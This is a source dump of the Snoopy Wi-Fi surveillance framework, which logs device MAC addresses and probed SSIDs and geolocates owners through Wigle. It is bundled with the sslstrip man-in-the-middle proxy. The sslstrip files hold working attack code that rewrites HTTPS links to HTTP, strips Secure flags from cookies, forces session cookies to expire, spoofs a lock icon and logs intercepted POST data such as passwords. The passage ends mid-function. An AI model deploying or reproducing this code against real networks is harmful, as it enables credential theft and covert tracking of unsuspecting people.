    timestamp = Column(Integer, nullable=False, default=0, primary_key=True)
    gps_lat = Column(Numeric(8, 6))
    gps_long = Column(Numeric(8, 6))
    accuracy = Column(Numeric(8, 6))


class Wigle(Base):
    __tablename__ = 'wigle'

    # COLUMNS #
    ssid = Column(String(100), default=None, primary_key=True)
    gps_long = Column(Numeric(11, 8), default=None, primary_key=True)
    gps_lat = Column(Numeric(11, 8), default=None, primary_key=True)
    last_update = Column(DateTime, default=None)
    mac = Column(CHAR(17), default=None)
    overflow = Column(SmallInteger, default=None)


class User(Base):
    __tablename__ = 'snoopy_user'

    # COLUMNS #
    id = Column(Integer, primary_key=True)
    name = Column(String(255, convert_unicode=True), unique=True)
    password_raw = Column('password', String(255, convert_unicode=True), nullable=False, default=u'')
    is_admin = Column(Boolean, default=False, nullable=False)

    @hybrid_property
    def password(self):
        return self.password_raw

    @password.setter
    def password(self, password):
        if len(password) < 8:
            raise ValueError('Password too short')
        self.password_raw = hash_password(password)

    # CLASS METHODS #
    @classmethod
    def check_password(cls, name, password):
        user = Session().query(cls).filter_by(name=name).first()
        if not user:
            return None
        return crypt.check(user.password, password) and user or None

    # SPECIAL METHODS #
    def __repr__(self):
        admin = ''
        if self.is_admin:
            admin = '*'
        return '<%s%s %d:%r>' % (admin, self.__class__.__name__, self.id, self.name)

########NEW FILE########
__FILENAME__ = gpsmovs
# -*- coding: utf-8 -*-

from snoopy import db, pluginregistry


@pluginregistry.add('client-data', 'gpsmovs', 'GPS Movements', js='/static/js/gpsmovs.js')
def gps_movements(mac):
    results = {}
    with db.SessionCtx() as session:
        query = session.query(db.Probe, db.GpsMovement).\
                    filter(
                        db.Probe.device_mac == mac,
                        db.Probe.monitor == db.GpsMovement.monitor,
                        db.GpsMovement.timestamp >= db.Probe.timestamp-5,
                        db.GpsMovement.timestamp <= db.Probe.timestamp+5,
                    ).\
                    order_by(db.GpsMovement.run_id, db.GpsMovement.timestamp)
        for probe_row, gpsmov_row in query:
            if gpsmov_row.run_id not in results:
                results[gpsmov_row.run_id] = []
            results[gpsmov_row.run_id].append({
                'long': float(gpsmov_row.gps_long),
                'lat': float(gpsmov_row.gps_lat),
                'accuracy': float(gpsmov_row.accuracy),
		'timestamp': str(gpsmov_row.timestamp)
            })
    return results

########NEW FILE########
__FILENAME__ = wifi
# -*- coding: utf-8 -*-

from snoopy import db, pluginregistry


@pluginregistry.add('client-data', 'ssids', 'SSIDs', js='/static/js/ssidlist.js')
def ssid_list(mac):
    with db.SessionCtx() as session:
        query = session.query(
            # SELECT probe_ssid, proximity_session FROM probes
            db.Probe.probe_ssid, db.Probe.proximity_session
        ).filter_by(
            # WHERE device_mac=$mac
            device_mac=mac
        ).group_by(
            # GROUP BY proximity_session, probe_ssid
            db.Probe.proximity_session, db.Probe.probe_ssid
        ).order_by(
            # ORDER BY probe_ssid
            db.Probe.probe_ssid
        )

        results = {}
        for ssid, prox_sess in query.all():
            if not ssid:
                ssid = '[blank ssid]'
            if not ssid or not prox_sess:
                continue
            if ssid not in results:
                results[ssid] = []
            if prox_sess not in results[ssid]:
                results[ssid].append(prox_sess)
        return results

########NEW FILE########
__FILENAME__ = wigle
# -*- coding: utf-8 -*-

from snoopy import db, pluginregistry


@pluginregistry.add('client-data', 'wigle', 'Wigle', js='/static/js/wigle.js')
def wigle(mac):
    results = []
    with db.SessionCtx() as session:
        query = session.query(db.Probe, db.Wigle).\
                    filter(
                        db.Probe.device_mac == mac,
                        db.Probe.probe_ssid == db.Wigle.ssid
                    ).\
                    group_by(db.Probe.device_mac, db.Probe.probe_ssid).\
                    order_by(db.Probe.timestamp)
        for probe_row, wigle_row in query:
            if wigle_row.gps_long is None or wigle_row.gps_lat is None:
                continue
            ssid = wigle_row.ssid
            if not ssid:
                ssid = '[unknown]'
            results.append({
                'long': float(wigle_row.gps_long),
                'lat': float(wigle_row.gps_lat),
                'ssid': wigle_row.ssid,
                'timestamp': str(probe_row.timestamp)
            })
    return results

########NEW FILE########
__FILENAME__ = main
import logging
#log = logging.getLogger('snoopy')

from beaker.middleware import SessionMiddleware
from flask import Flask, jsonify, request, redirect, render_template, url_for
from sqlalchemy import distinct, func

from snoopy import config, db, pluginregistry

from snoopy.web import login_required


app = Flask('snoopy')

@app.route('/')
@login_required
def main():
    return render_template('main.html')


@app.route('/login')
def login():
    beaker = request.environ['beaker.session']
    if beaker.has_key('userid'):
        return redirect(url_for('main'))
    else:
        return render_template('login.html')


@app.route('/login', methods=['POST'])
def perform_login_json():
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    user = db.User.check_password(username, password)
    if user:
        beaker = request.environ['beaker.session']
        beaker['userid'] = user.id
        beaker.save()
        return jsonify(success=True)
    return jsonify(success=False)


@app.route('/logout')
def logout():
    beaker = request.environ['beaker.session']
    del beaker['userid']
    beaker.save()
    return redirect(url_for('login'))


@app.route('/drone/list', methods=['POST'])
@login_required
def drone_list_json():
    try:
        with db.SessionCtx() as session:
            devlist = session.query(
                db.Probe.monitor, func.count(distinct(db.Probe.device_mac))
            ).group_by(db.Probe.monitor).all()
            devlist = [dict(zip(('devname', 'n_macs'), d)) for d in devlist]
            return jsonify(success=True, drones=devlist)
    except Exception:
        logging.exception('Error getting monitor list:')
        return jsonify(success=False, errors=['Internal error'])


@app.route('/client/list', methods=['POST'])
@login_required
def client_list_json():
    if not request.form.has_key('monitor'):
        logging.error('No monitor specified. This should not happen.')
        return jsonify(success=True, clients=[])
    monitor = request.form['monitor']
    try:
        with db.SessionCtx() as session:
            clients = session.query(
                db.Probe.device_mac,
                func.count(distinct(db.Probe.proximity_session)).label('cnt')
            )
            if monitor != '*':
                clients = clients.filter_by(monitor=monitor)
            clients = clients.group_by(db.Probe.device_mac)
            clients = clients.order_by('cnt DESC').all()
            clients = [{'mac': c[0], 'n_sessions': c[1]} for c in clients]
            return jsonify(success=True, clients=clients)
    except Exception:
        logging.exception('Error getting probed device list:')
        return jsonify(success=False, errors=['Internal error'])


@app.route('/client/data/get', methods=['POST'])
@login_required
def client_data_get():
    mac = request.form.get('mac', None)
    if not mac:
        return jsonify(success=False, errors=['Invalid request'])
    cldata = {}
    for fn, options in pluginregistry.plugins['client-data'].iteritems():
        cldata[options['name']] = dict(title=options['title'], data=fn(mac))
    return jsonify(success=True, client_data=cldata)


@app.route('/plugin/list', methods=['POST'])
@login_required
def plugin_list():
    if request.form.get('group'):
        group = request.form.get('group')
        groupfilter = lambda x: x == group
    else:
        groupfilter = lambda x: True

    plugindata = []
    for group, plugins in pluginregistry.plugins.iteritems():
        if not groupfilter(group):
            continue
        for fn, options in plugins.iteritems():
            if 'js' in options:
                plugindata.append({'jsurl': options['js']})
    return jsonify(success=True, plugins=plugindata)


####################################################


def start():
    config.from_sysargv()
    db.init(None)
    pluginregistry.collect()
    app.wsgi_app = SessionMiddleware(app.wsgi_app, config['beaker'])
    app.config.update(config['flask'])
    app.run(host='0.0.0.0')

if __name__ == '__main__':
    start()

########NEW FILE########
__FILENAME__ = snoopy_server
#!/usr/bin/python
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# Don't run directly, but via snoopy.sh
# This Script starts various Snoopy components

#ToDo: Incorporate all Snoopy components into a single snoopy.py file.

import logging
import prox_guid
import pytail
import facebook
import ssid_to_loc

import os
import time
import sys
import signal
from multiprocessing import Process

snoopyBinPath=os.path.dirname(os.path.realpath(__file__))

sys.path.append("%s/snoopy/src/snoopy"%snoopyBinPath)
from snoopy.web import main as webmain
webmain.app.root_path = "%s/snoopy/src/snoopy/"%snoopyBinPath

goFlag=True

def signal_handler(signal, frame):
	global goFlag
        logging.debug('Caught SIGINT, ending.')
	goFlag=False
signal.signal(signal.SIGINT, signal_handler)

def main(snoopyDir):

	global goFlag
	while ( goFlag ):

		logging.basicConfig(filename="%s/logs/snoopy.log"%(snoopyDir),level=logging.INFO,format='%(asctime)s %(levelname)s %(filename)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')
		logging.info("\n--------------------------------------------------------------")
		logging.info("Main Snoopy Process starting. Divert all power to the engines!")
		pool=[]
		pool.append( Process(target=prox_guid.main) )
		pool.append( Process(target=facebook.main, args=('%s'%(snoopyDir),)) )
		pool.append( Process(target=pytail.main, args=('%s/uploads/'%(snoopyDir),)) )	
		pool.append(Process(target=ssid_to_loc.main) )
		pool.append(Process(target=webmain.start))
	
		for p in pool:
			p.start()
	
		all_good=True
		while all_good and goFlag:
			for p in pool:
				if not p.is_alive():
					all_good = False
			time.sleep(2)
	
		for p in pool:
			p.terminate()
	
		if(  goFlag ):
			logging.warning("One of my processes died, I'll restart all")
			main(snoopyDir)
	
	logging.debug("Process ended")

if __name__ == "__main__":
	snoopyDir=sys.argv[1]
	try:
        	main(snoopyDir)
	except Exception, e:
		logging.error("Main Snoopy thread exception: %s" %str(e))


########NEW FILE########
__FILENAME__ = ssid_to_loc
#!/usr/bin/python
# coding=utf-8
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# Uses wigle_api to query SSIDs from the MySQL database

from wigle_api_lite import fetchLocations
import time
import stawk_db
import sys
import re
import logging

from warnings import filterwarnings
import MySQLdb as Database
filterwarnings('ignore', category = Database.Warning)

num_threads=2
Flag=True
bad_ssids={}
#if len(sys.argv) < 2:
	#priority=None
#	priority=2
#else:
	# Allows us to set real time priority, e.g for Maltego
#	priority=int(sys.argv[1])

def main():
	logging.info("Starting Wigle GeoLocator")

	cursor = stawk_db.dbconnect()
	while Flag:
		cursor.execute("SELECT DISTINCT probe_ssid FROM probes WHERE probe_ssid != '' AND probe_ssid NOT LIKE '%\\\\\\%' AND probe_ssid NOT IN (SELECT DISTINCT ssid from wigle) ORDER BY PRIORITY")
		result=cursor.fetchall()
		if(len(result) > 0):
			logging.info("Looking up address for %d SSIDs" %len(result))
		for r in result:
			if r[0] in bad_ssids and bad_ssids[r[0]] > 4:
				logging.info("Ignoring bad SSID '%s' after %d failed lookups"%(r[0],bad_ssids[r[0]]))
				cursor.execute("INSERT INTO wigle (ssid,overflow) VALUES (%s,-2)",(ssid))
			else:
				locations=fetchLocations(r[0])
	
				if locations == None:
					logging.info("Wigle account has been shunned, backing off for 20 minutes")
					time.sleep(60*20)
				elif 'error' in locations:
					logging.info("An error occured, will retry in 60 seconds (%s)" %locations['error'])
					if r[0] not in bad_ssids:
						bad_ssids[r[0]]=0
					bad_ssids[r[0]]+=1
					#print bad_ssids
					time.sleep(60)
	
				else:
					for l in locations:
	        	                	country,code,address="","",""
	                	        	if( 'country' in l['ga'] ):
	                        			country=l['ga']['country']
		                        	if( 'code' in l['ga'] ):
	        	                 		code=l['ga']['code']
	                	         	if( 'address' in l['ga'] ):
	                        	 		address=l['ga']['address']
	
		                                ssid=l['ssid']
	       	                        	g_long=l['long']
	                                	g_lat=l['lat']
	                                	mac=re.sub(':','',l['mac'])
	                                	last_seen=l['last_seen']
	                                	overflow=l['overflow']
					
	
	
	#                                	logging.info("INSERT INTO wigle (ssid,mac,gps_lat,gps_long,last_update,overflow, country,code,address) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s','%s')"%(ssid,mac,g_lat,g_long,last_seen,overflow,country,code,address))
	                                	cursor.execute("INSERT INTO wigle (ssid,mac,gps_lat,gps_long,last_update,overflow, country,code,address) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s)",(ssid,mac,g_lat,g_long,last_seen,overflow,country,code,address))


#			print locations

		time.sleep(5)

if __name__ == "__main__":
        logging.basicConfig(level=logging.DEBUG,format='%(asctime)s %(levelname)s %(filename)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')

	while True:
		try:
        		main()
		except Exception, e:
			logging.error("Beware the ides of March")
			logging.error(e)
			time.sleep(10)


########NEW FILE########
__FILENAME__ = ClientRequest
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import urlparse, logging, os, sys, random

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from SSLServerConnection import SSLServerConnection
from URLMonitor import URLMonitor
from CookieCleaner import CookieCleaner
from DnsCache import DnsCache

class ClientRequest(Request):

    ''' This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we dont like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    '''    
    
    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        self.urlMonitor    = URLMonitor.getInstance()
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache      = DnsCache.getInstance()
#        self.uniqueId      = random.randint(0, 10000)

    def cleanHeaders(self):
        headers = self.getAllHeaders().copy()

        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        if 'if-modified-since' in headers:
            del headers['if-modified-since']

        if 'cache-control' in headers:
            del headers['cache-control']

        return headers

    def getPathFromUri(self):
        if (self.uri.find("http://") == 0):
            index = self.uri.find('/', 7)
            return self.uri[index:]

        return self.uri        

    def getPathToLockIcon(self):
        if os.path.exists("lock.ico"): return "lock.ico"

        scriptPath = os.path.abspath(os.path.dirname(sys.argv[0]))
        scriptPath = os.path.join(scriptPath, "../share/sslstrip/lock.ico")

        if os.path.exists(scriptPath): return scriptPath

        logging.warning("Client:%s Error: Could not find lock.ico" % (self.getClientIP()))
        return "lock.ico"        

    def handleHostResolvedSuccess(self, address):
        logging.debug("Client:%s Resolved host successfully: %s -> %s" % (self.getClientIP(), self.getHeader('host'), address))
        host              = self.getHeader("host")
        headers           = self.cleanHeaders()
        client            = self.getClientIP()
        path              = self.getPathFromUri()

        self.content.seek(0,0)
        postData          = self.content.read()
        url               = 'http://' + host + path

        self.dnsCache.cacheResolution(host, address)

        if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
            logging.debug("Client:%s Sending expired cookies..." % (self.getClientIP()))
            self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
                                                                                    host, headers, path))
        elif (self.urlMonitor.isSecureFavicon(client, path)):
            logging.debug("Client:%s Sending spoofed favicon response..." % (self.getClientIP()))
            self.sendSpoofedFaviconResponse()
        elif (self.urlMonitor.isSecureLink(client, url)):
            logging.debug("Client:%s Sending request via SSL..." % (self.getClientIP()))
            self.proxyViaSSL(address, self.method, path, postData, headers,
                             self.urlMonitor.getSecurePort(client, url))
        else:
            logging.debug("Client:%s Sending request via HTTP..." % (self.getClientIP()))
            self.proxyViaHTTP(address, self.method, path, postData, headers)

    def handleHostResolvedError(self, error):
        logging.warning("Client:%s Host resolution error: " + str(error) % (self.getClientIP()))
        self.finish()

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)

        if address != None:
            logging.debug("Client:%s Host cached." % (self.getClientIP()))
            return defer.succeed(address)
        else:
            logging.debug("Client:%s Host not cached." % (self.getClientIP()))
            return reactor.resolve(host)

    def process(self):
        logging.debug("Client:%s Resolving host: %s" % (self.getClientIP(), self.getHeader('host')))
        host     = self.getHeader('host')               
        deferred = self.resolveHost(host)

        deferred.addCallback(self.handleHostResolvedSuccess)
        deferred.addErrback(self.handleHostResolvedError)
        
    def proxyViaHTTP(self, host, method, path, postData, headers):
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = ServerConnection
        self.reactor.connectTCP(host, 80, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, headers, port):
        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = SSLServerConnection
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302, "Moved")
        self.setHeader("Connection", "close")
        self.setHeader("Location", "http://" + host + path)
        
        for header in expireHeaders:
            self.setHeader("Set-Cookie", header)

        self.finish()        
        
    def sendSpoofedFaviconResponse(self):
        icoFile = open(self.getPathToLockIcon())

        self.setResponseCode(200, "OK")
        self.setHeader("Content-type", "image/x-icon")
        self.write(icoFile.read())
                
        icoFile.close()
        self.finish()

########NEW FILE########
__FILENAME__ = CookieCleaner
# Copyright (c) 2004-2011 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import string

class CookieCleaner:
    '''This class cleans cookies we haven't seen before.  The basic idea is to
    kill sessions, which isn't entirely straight-forward.  Since we want this to
    be generalized, there's no way for us to know exactly what cookie we're trying
    to kill, which also means we don't know what domain or path it has been set for.

    The rule with cookies is that specific overrides general.  So cookies that are
    set for mail.foo.com override cookies with the same name that are set for .foo.com,
    just as cookies that are set for foo.com/mail override cookies with the same name
    that are set for foo.com/

    The best we can do is guess, so we just try to cover our bases by expiring cookies
    in a few different ways.  The most obvious thing to do is look for individual cookies
    and nail the ones we haven't seen coming from the server, but the problem is that cookies are often
    set by Javascript instead of a Set-Cookie header, and if we block those the site
    will think cookies are disabled in the browser.  So we do the expirations and whitlisting
    based on client,server tuples.  The first time a client hits a server, we kill whatever
    cookies we see then.  After that, we just let them through.  Not perfect, but pretty effective.

    '''

    _instance = None

    def getInstance():
        if CookieCleaner._instance == None:
            CookieCleaner._instance = CookieCleaner()

        return CookieCleaner._instance

    getInstance = staticmethod(getInstance)

    def __init__(self):
        self.cleanedCookies = set();
        self.enabled        = False

    def setEnabled(self, enabled):
        self.enabled = enabled

    def isClean(self, method, client, host, headers):
        if method == "POST":             return True
        if not self.enabled:             return True
        if not self.hasCookies(headers): return True
        
        return (client, self.getDomainFor(host)) in self.cleanedCookies

    def getExpireHeaders(self, method, client, host, headers, path):
        domain = self.getDomainFor(host)
        self.cleanedCookies.add((client, domain))

        expireHeaders = []

        for cookie in headers['cookie'].split(";"):
            cookie                 = cookie.split("=")[0].strip()            
            expireHeadersForCookie = self.getExpireCookieStringFor(cookie, host, domain, path)            
            expireHeaders.extend(expireHeadersForCookie)
        
        return expireHeaders

    def hasCookies(self, headers):
        return 'cookie' in headers        

    def getDomainFor(self, host):
        hostParts = host.split(".")
        return "." + hostParts[-2] + "." + hostParts[-1]

    def getExpireCookieStringFor(self, cookie, host, domain, path):
        pathList      = path.split("/")
        expireStrings = list()
        
        expireStrings.append(cookie + "=" + "EXPIRED;Path=/;Domain=" + domain + 
                             ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")

        expireStrings.append(cookie + "=" + "EXPIRED;Path=/;Domain=" + host + 
                             ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")

        if len(pathList) > 2:
            expireStrings.append(cookie + "=" + "EXPIRED;Path=/" + pathList[1] + ";Domain=" +
                                 domain + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")

            expireStrings.append(cookie + "=" + "EXPIRED;Path=/" + pathList[1] + ";Domain=" +
                                 host + ";Expires=Mon, 01-Jan-1990 00:00:00 GMT\r\n")
        
        return expireStrings

    

########NEW FILE########
__FILENAME__ = DnsCache

class DnsCache:    

    '''
    The DnsCache maintains a cache of DNS lookups, mirroring the browser experience.
    '''

    _instance          = None

    def __init__(self):
        self.cache = {}

    def cacheResolution(self, host, address):
        self.cache[host] = address

    def getCachedAddress(self, host):
        if host in self.cache:
            return self.cache[host]

        return None

    def getInstance():
        if DnsCache._instance == None:
            DnsCache._instance = DnsCache()

        return DnsCache._instance

    getInstance = staticmethod(getInstance)

########NEW FILE########
__FILENAME__ = ServerConnection
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip, StringIO

from twisted.web.http import HTTPClient
from URLMonitor import URLMonitor

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.urlMonitor       = URLMonitor.getInstance()
        self.isImageRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False
	print self.client

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.log(self.getLogLevel(), "Client:%s Sending Request: %s %s"  % (self.client.getClientIP(), self.command, self.uri))
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Client:%s Sending header: %s : %s" % (self.client.getClientIP(), header, value))
            self.sendHeader(header, value)

        self.endHeaders()

    def sendPostData(self):
        logging.warning("Client:" + self.client.getClientIP() + " " + self.getPostPrefix() + " Data (" + self.headers['host'] + "):\n" + str(self.postData))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "Client:%s HTTP connection made."  % (self.client.getClientIP()))
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Client:%s Got server response: %s %s %s" % (self.client.getClientIP(), version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        logging.log(self.getLogLevel(), "Client:%s Got server header: %s:%s" % (self.client.getClientIP(), key, value))

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value)

        if (key.lower() == 'content-type'):
            if (value.find('image') != -1):
                self.isImageRequest = True
                logging.debug("Client:%s Response is image content, not scanning..."  % (self.client.getClientIP()))

        if (key.lower() == 'content-encoding'):
            if (value.find('gzip') != -1):
                logging.debug("Client:%s Response is compressed..."  % (self.client.getClientIP()))
                self.isCompressed = True
        elif (key.lower() == 'content-length'):
            self.contentLength = value
        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key, value)
        else:
            self.client.setHeader(key, value)

    def handleEndHeaders(self):
       if (self.isImageRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isImageRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isImageRequest):
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Client:%s Decompressing content..."  % (self.client.getClientIP()))
            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
        logging.log(self.getLogLevel(), "Client:" + self.client.getClientIP() + " Read from server:\n" + data)

        data = self.replaceSecureLinks(data)

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))
        
        self.client.write(data)
        self.shutdown()

    def replaceSecureLinks(self, data):
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            logging.debug("Client:" + self.client.getClientIP() + " Found secure reference: " + url)

            url = url.replace('https://', 'http://', 1)
            url = url.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
        return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            self.client.finish()
            self.transport.loseConnection()



########NEW FILE########
__FILENAME__ = ServerConnectionFactory
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
from twisted.internet.protocol import ClientFactory

class ServerConnectionFactory(ClientFactory):

    def __init__(self, command, uri, postData, headers, client):
        self.command      = command
        self.uri          = uri
        self.postData     = postData
        self.headers      = headers
        self.client       = client

    def buildProtocol(self, addr):
        return self.protocol(self.command, self.uri, self.postData, self.headers, self.client)
    
    def clientConnectionFailed(self, connector, reason):
        logging.debug("Client:%s Server connection failed." % (self.client.getClientIP()))

        destination = connector.getDestination()

        if (destination.port != 443):
            logging.debug("Client:%s Retrying via SSL" % (self.client.getClientIP()))
            self.client.proxyViaSSL(self.headers['host'], self.command, self.uri, self.postData, self.headers, 443)
        else:
            self.client.finish()


########NEW FILE########
__FILENAME__ = SSLServerConnection
# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string

from ServerConnection import ServerConnection

class SSLServerConnection(ServerConnection):

    ''' 
    For SSL connections to a server, we need to do some additional stripping.  First we need
    to make note of any relative links, as the server will be expecting those to be requested
    via SSL as well.  We also want to slip our favicon in here and kill the secure bit on cookies.
    '''

    cookieExpression   = re.compile(r"([ \w\d:#@%/;$()~_?\+-=\\\.&]+); ?Secure", re.IGNORECASE)
    cssExpression      = re.compile(r"url\(([\w\d:#@%/;$~_?\+-=\\\.&]+)\)", re.IGNORECASE)
    iconExpression     = re.compile(r"<link rel=\"shortcut icon\" .*href=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    linkExpression     = re.compile(r"<((a)|(link)|(img)|(script)|(frame)) .*((href)|(src))=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    headExpression     = re.compile(r"<head>", re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
	self.client = client
        ServerConnection.__init__(self, command, uri, postData, headers, client)

    def getLogLevel(self):
        return logging.INFO

    def getPostPrefix(self):
        return "SECURE POST"

    def handleHeader(self, key, value):
        if (key.lower() == 'set-cookie'):
            value = SSLServerConnection.cookieExpression.sub("\g<1>", value)

        ServerConnection.handleHeader(self, key, value)

    def stripFileFromPath(self, path):
        (strippedPath, lastSlash, file) = path.rpartition('/')
        return strippedPath

    def buildAbsoluteLink(self, link):
        absoluteLink = ""
        
        if ((not link.startswith('http')) and (not link.startswith('/'))):                
            absoluteLink = "http://"+self.headers['host']+self.stripFileFromPath(self.uri)+'/'+link

            logging.debug("Client:%s Found path-relative link in secure transmission: " + link % (self.client.getClientIP()))
            logging.debug("Client:%s New Absolute path-relative link: " + absoluteLink % (self.clien.getClientIP()))                
        elif not link.startswith('http'):
            absoluteLink = "http://"+self.headers['host']+link

            logging.debug("Client:%s Found relative link in secure transmission: " + link % (self.client.getClientIP()))
            logging.debug("Client:%s New Absolute link: " + absoluteLink % (self.client.getClientIP()))                            

        if not absoluteLink == "":                
            absoluteLink = absoluteLink.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), absoluteLink);        

    def replaceCssLinks(self, data):
        iterator = re.finditer(SSLServerConnection.cssExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(1))

        return data

    def replaceFavicon(self, data):
        match = re.search(SSLServerConnection.iconExpression, data)

        if (match != None):
            data = re.sub(SSLServerConnection.iconExpression,
                          "<link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
        else:
            data = re.sub(SSLServerConnection.headExpression,
                          "<head><link rel=\"SHORTCUT ICON\" href=\"/favicon-x-favicon-x.ico\">", data)
            
        return data
        
    def replaceSecureLinks(self, data):
        data = ServerConnection.replaceSecureLinks(self, data)
